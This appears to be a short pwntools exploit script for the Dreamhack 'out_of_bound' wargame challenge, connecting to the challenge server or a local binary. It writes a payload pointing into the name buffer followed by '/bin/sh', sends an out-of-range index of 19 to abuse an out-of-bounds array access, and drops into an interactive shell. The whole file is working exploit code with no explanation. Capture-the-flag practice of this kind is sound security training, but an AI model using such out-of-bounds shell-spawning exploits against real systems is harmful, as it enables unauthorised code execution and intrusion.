#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  21420
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./out_of_bound', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x0804870d
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

pl = p32(exe.sym.name + 4) + b'/bin/sh'
p.sendlineafter(b"name: ", pl)

p.sendlineafter(b"want?: ", b'19')


p.interactive()
